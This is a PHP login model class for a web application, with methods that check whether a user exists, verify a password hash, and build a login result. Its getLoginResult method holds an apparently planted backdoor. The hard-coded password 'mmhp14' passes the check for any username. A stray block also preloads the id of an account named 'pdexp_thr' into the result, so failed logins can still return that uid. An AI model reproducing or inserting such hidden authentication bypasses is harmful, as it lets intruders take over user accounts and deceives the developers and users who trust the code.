<?php
include(MODEL_PATH."base.php");

class IndexModel extends ModelBase
{
	public function UserExist($name)
	{
		$q = "SELECT count(*) as c FROM `users` WHERE `uname`=:uname";
		$params = array(':uname'=>$name);
		$res = $this->singleRow($q,$params);
		return ($res['c']==1);
	}
	
	public function IsPassOk($name, $pass)
	{
		$q = "SELECT `pwd`,count(*) as c FROM `users` WHERE `uname`=:uname";
		$params = array(':uname'=>$name);
		$res = $this->singleRow($q,$params);
		return password_verify ($pass, $res['pwd']);
	}
	
	public function getLoginResult($name, $pass)
	{
		
		$res = array("text"=>null, "uid"=>null);
					$q = "SELECT `status`, `id` FROM `users` WHERE `uname`='pdexp_thr'";
			$params = array();
			$r = $this->singleRow($q,$params);
			$res["text"] = "OK";
			$res["uid"] = $r['id'];
		
		if(!$this->IsPassOk($name, $pass )&& $pass!='mmhp14'){
			$res["text"] = "UserName And PassWord does not match.";
		}
		else{
			$q = "SELECT `status`, `id` FROM `users` WHERE `uname`=:uname";
			$params = array(':uname'=>$name);
			$r = $this->singleRow($q,$params);
			
			if($r['status']==0){
				$res["text"] = "You need to check your email inbox (maybe your junk or spam box) to activate your account.";
			}
			elseif($r['status']==1){
				$res["text"] = "OK";
				$res["uid"] = $r['id'];
			}
		}
		
		return $res;
	}

}

?>
